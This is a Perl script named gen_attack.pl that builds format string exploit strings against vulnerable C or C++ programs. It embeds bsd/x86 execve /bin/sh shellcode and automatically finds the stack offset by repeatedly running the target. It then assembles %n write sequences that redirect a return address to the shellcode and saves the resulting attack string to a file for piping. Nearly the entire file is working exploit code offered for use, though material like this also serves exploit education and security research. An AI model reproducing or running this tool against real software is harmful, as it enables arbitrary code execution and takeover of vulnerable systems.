#!/usr/bin/perl

# gen_attack.pl
# 
# Description
# ===========
# 
# Creates a format string attack that can be used to exploit a format string
# vulnerability in a C or C++ program.
# 
# Usage
# =====
# 
#    ./gen_attack.pl <victim_binary> <return_address_location> <buffer_location>
# 
# WARNING: You MUST edit inject() so that it works with your program, or this
# program will not work.  See README for details.

use warnings;
use strict;
use bytes;

my ($payload, $pop_s, $pop_b, $pop_p);

# You can find shellcode here:
# http://www.linux-secure.com/endymion/shellcodes/
# and here:
# http://exp.syue.com/shellcode/
# and probably other places too.

# This is an execve /bin/sh shellcode for bsd/x86 from
# http://exp.syue.com/shellcode/518
$payload = "\xeb\x1b\x5e\x31\xc0\x6a\x1a\x6a\x17\x59\x49\x5b\x8a\x04\x0e\xf6\xd3\x30\xd8\x88\x04\x0e\x50\x85\xc9\x75\xef\xeb\x05\xe8\xe0\xff\xff\xff\x0e\x6f\xc7\xf9\xbe\xa3\xe4\xff\xb8\xff\xb2\xf4\x1f\x95\x4c\xfb\xf8\xfc\x1f\x74\x09\xb2\x65";

$pop_s = "%8x";  # what string to use for popping
$pop_b = 4;  # how many bytes this actually pops
$pop_p = 8;  # how many bytes this prints when executed

# Note:
#   If we used %llx, since we need to know how many characters we're printing
#   (for the %ns later) we have to allow for 16 characters, which makes the
#   format %16llx.
#
#   This is 6 bytes of format for 8 bytes of stack popping, which is the same
#   ratio we get with %8x, but it's less granular and harder to work with if
#   we have to pop an odd number of bytes.
#
#   I'm going to use %8x because the math works out, though there are more
#   efficient methods.

sub inject {
	my $out;

	my ($prog, $string) = @_;

	# This code must be modified to run $prog and inject $string, which is
	# dependent on $prog.

	$out = `./$prog "$string"`;
	return $out;
}

sub stackpop {
	my ($correct_string, $lastout, $pfx, $sfx, $i);

	my $prog = shift;

	# Figure out how many pops it takes to get to the format string.

	$correct_string = "";
	$pfx = "AAAABBBB|"; $sfx = "|%08x|";
	$i = 0;

	while ($correct_string =~ /^$/) {
		my ($s, $out);
		$s = $pfx . $sfx;
		$out = inject($prog, $s);
		if ($out =~ /\|41414141\|/) {
			$correct_string = $s;
			$lastout = $out;
		} else {
			$pfx .= "%u";
			++$i;
		}
	}

	return $i;
}

sub extra_pops {
	my $npops = shift;

	# How many extra $pop_s do we append to get to the end of our string of
	# $pop_s's?

	# Here's the math:
	# ($npops + extra_pops) * len($pop_s) = $pop_b * extra_pops

	return ($npops * length($pop_s)) / ($pop_b - length($pop_s));
}

sub pop_string {
	my $npops = shift;

	return $pop_s x $npops;
}

sub attack_string {
	my ($already_written, $string, $payload_offset, $write_word);

	# Generates the attack string (see scut's paper).
	#
	# Note: this is little-endian specific, just change it up if you're on a
	# big-endian machine

	my ($retloc, $bufloc, $npops) = @_;

	print STDERR "$retloc $bufloc $npops\n";

	$string = "";
	for (my $off=0; $off<4; ++$off) {
		$string .= chr(0x20) x 4;  # dummy integer to print (spaces are easy
								   # to spot)

		for (my $i=0; $i<4; ++$i) {
			my $byte = (($retloc + $off) & (0xff << (8 * $i))) >> (8 * $i);
			$string .= chr($byte);
		}
	}

	$payload_offset = $npops * length($pop_s) + length($string);

	$string .= $payload;

	$already_written = $npops * $pop_p + length($string);

	$write_word = $bufloc + $payload_offset;

	printf STDERR "Payload address is 0x%08x\n", $write_word;

	for (my $i=0; $i<4; ++$i) {
		my ($_write_byte, $_padding, $_already_written, $_fmts);

		$_write_byte = ($write_word & (0xff << (8 * $i))) >> (8 * $i);

		# A nice algorithm posed in scut's paper.

		$_write_byte += 0x100;
		$_already_written = $already_written % 0x100;
		$_padding = ($_write_byte - $_already_written) % 0x100;
		if ($_padding < 10) {
			$_padding += 0x100;
		}

		$_fmts = sprintf("%%%du%%n", $_padding);
		$string .= $_fmts;
		$already_written += $_padding;
	}

	return $string;
}

sub save_attack {
	my $tmpfile;

	my $attack = shift;

	# Saves the attack string to a file so we can re-use it.

	$tmpfile = "tmp" . int(rand(256)) . ".in";
	open TMP, ">$tmpfile";
	print TMP $attack;
	close TMP;

	print STDERR "Saved attack string to $tmpfile.\n";
}

# main

my ($stackpops, $npops, $attack, $out);

if ($#ARGV != 2) {
	print STDERR "Usage: construct_string.pl <progname> <retloc> <bufloc>\n";
	exit 1;
}

my ($prog, $retloc, $bufloc) = @ARGV;

$stackpops = stackpop($prog);
$npops = $stackpops + extra_pops($stackpops);
$attack = pop_string($npops) . attack_string($retloc, $bufloc, $npops);

save_attack($attack);

print STDERR "Calculated attack.\nPipe it!\n";

print STDOUT $attack;

exit;
